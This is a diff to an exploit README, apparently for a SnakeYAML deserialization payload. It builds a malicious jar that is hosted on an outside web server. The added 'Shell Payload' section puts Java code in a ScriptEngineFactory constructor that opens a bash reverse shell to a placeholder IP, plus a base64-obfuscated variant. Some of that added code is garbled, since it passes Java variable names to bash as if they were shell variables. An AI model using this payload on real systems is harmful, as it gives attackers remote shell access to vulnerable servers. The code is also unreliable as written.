@@ -13,3 +13,18 @@ jar -cvf yaml-payload.jar -C src/ .
 ```
 
 Then place the 'yaml-payload.jar' file in to the web server folder (e.g. artsploit.com/yaml-payload.jar)
+
+Shell Payload
+```
+public AwesomeScriptEngineFactory() {
+        String[] cmd = { "bash", "-c", "bash -i >& /dev/tcp/x.x.x.x/16881 0>&1" };
+        String[] jex = { "bash", "-c", "{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}" };
+        try {
+            Runtime.getRuntime().exec(cmd);
+            Runtime.getRuntime().exec(jex);
+            Runtime.getRuntime().exec("echo $jex");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+```
